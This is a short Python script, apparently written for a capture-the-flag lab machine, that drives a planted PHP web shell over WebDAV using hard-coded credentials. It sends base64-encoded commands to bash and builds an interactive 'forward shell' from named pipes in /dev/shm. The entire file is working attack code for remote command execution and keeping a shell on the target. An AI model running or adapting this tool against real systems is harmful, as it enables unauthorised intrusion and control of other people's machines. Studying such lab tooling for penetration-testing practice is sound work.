#!/usr/bin/python3

import requests
import sys
import pdb
import signal
from random import randrange
from base64 import b64encode

def def_handler(sig, frame):
        print("\n\n[!] Saliendo ...\n")
        sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/cmd.php"
global stdin, stdout
session = randrange(1, 9999)
stdin = "/dev/shm/stdin.%s" % session
stdout = "/dev/shm/stdout.%s" % session

def RunCmd(command):

        command = b64encode(command.encode()).decode()

        post_data = {
                'cmd': 'echo "%s" | base64 -d | bash' % command
        }

        r = requests.post(main_url, data=post_data, timeout=2)

        return r.text

def WriteCmd(command):

        command = b64encode(command.encode()).decode()

        post_data = {
                'cmd': 'echo "%s" | base64 -d > %s' % (command, stdin)
        }

        r = requests.post(main_url, data=post_data, timeout=2)

        return r.text

def ReadCmd():

        ReadTheOutput = """/bin/cat %s""" % stdout
        
        response = RunCmd(ReadTheOutput)
        
        return response

def SetupShell():

        NamedPipes = """mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s""" % (stdin, stdin, stdout)

        try:
                RunCmd(NamedPipes)
        except:
                None

        return None

SetupShell()

if __name__ == '__main__':

        while True:
                command = input("> ")
                WriteCmd(command + "\n")
                response = ReadCmd()
                
                print(response)
                
                ClearTheOutput = """echo '' > %s""" % stdout
                RunCmd(ClearTheOutput)
